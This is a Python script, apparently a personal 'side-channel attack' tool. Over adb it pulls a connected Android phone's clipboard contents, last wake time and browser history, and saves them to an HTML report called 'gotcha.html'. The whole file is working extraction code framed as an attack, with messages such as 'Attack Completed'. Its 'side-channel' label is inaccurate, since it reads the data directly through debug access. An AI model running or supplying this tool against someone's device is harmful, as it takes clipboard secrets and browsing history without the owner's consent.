import subprocess
import time

def adb_command(command):
    """Helper function to run adb commands."""
    try:
        result = subprocess.run(f"adb shell {command}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8').strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return None

def get_clipboard_data():
    """Retrieve clipboard contents from the device."""
    clipboard_command = "dumpsys clipboard | grep 'data='"
    clipboard_data = adb_command(clipboard_command)
    if clipboard_data:
        return clipboard_data.split("data=")[-1].strip()
    return "Clipboard data not available."

def get_last_wakeup_time():
    """Retrieve last wakeup time from the device."""
    wakeup_command = "dumpsys power | grep 'mLastWakeTime'"
    wakeup_time = adb_command(wakeup_command)
    if wakeup_time:
        return wakeup_time.split("=")[-1].strip()
    return "Wakeup time not available."

def get_browsing_history():
    """Retrieve browsing history from Chrome (if installed)."""
    # Use content provider to access browser history
    history_command = "content query --uri content://browser/bookmarks --projection title,url --where \"bookmark=0\""
    history_data = adb_command(history_command)
    if history_data:
        return history_data
    return "Browsing history not available."

def create_html_report(clipboard, wakeup_time, browsing_history):
    """Generate an HTML report with the extracted data."""
    html_content = f"""
    <html>
    <head>
        <title>Side-Channel Attack Report - Created by N Vishnu Venkatesh</title>
        <style>
            body {{
                background-color: black;
                color: lime;
                font-family: 'Courier New', Courier, monospace;
                text-align: center;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px #FF0000;
            }}
            .banner {{
                background-color: #000;
                color: #0F0;
                border: 2px solid lime;
                padding: 10px;
                margin: 20px auto;
                width: 80%;
            }}
            .section {{
                margin: 20px;
                padding: 20px;
                border: 2px solid #0F0;
                box-shadow: 0 0 10px lime;
                width: 80%;
                margin-left: auto;
                margin-right: auto;
                background-color: rgba(0, 255, 0, 0.1);
            }}
            pre {{
                text-align: left;
                margin: 20px;
                padding: 10px;
                background-color: black;
                color: #0F0;
                font-size: 1.2em;
                border: 1px solid #0F0;
                overflow: auto;
            }}
        </style>
    </head>
    <body>
        <div class="banner">
            <h1>Created by N Vishnu Venkatesh - Cyber Forensic Expert</h1>
        </div>
        <div class="section">
            <h2>Clipboard Data</h2>
            <pre>{clipboard}</pre>
        </div>
        <div class="section">
            <h2>Last Wakeup Time</h2>
            <pre>{wakeup_time}</pre>
        </div>
        <div class="section">
            <h2>Browsing History</h2>
            <pre>{browsing_history}</pre>
        </div>
    </body>
    </html>
    """

    # Save the report to gotcha.html
    with open("gotcha.html", "w") as file:
        file.write(html_content)

    print("HTML report saved as gotcha.html")

def main():
    print("Starting Side-Channel Attack...")

    # Collect clipboard data
    clipboard = get_clipboard_data()
    print(f"Clipboard Data: {clipboard}")

    # Collect last wakeup time
    wakeup_time = get_last_wakeup_time()
    print(f"Last Wakeup Time: {wakeup_time}")

    # Collect browsing history
    browsing_history = get_browsing_history()
    print(f"Browsing History: {browsing_history}")

    # Create HTML report
    create_html_report(clipboard, wakeup_time, browsing_history)

    print("Attack Completed.")

if __name__ == "__main__":
    main()
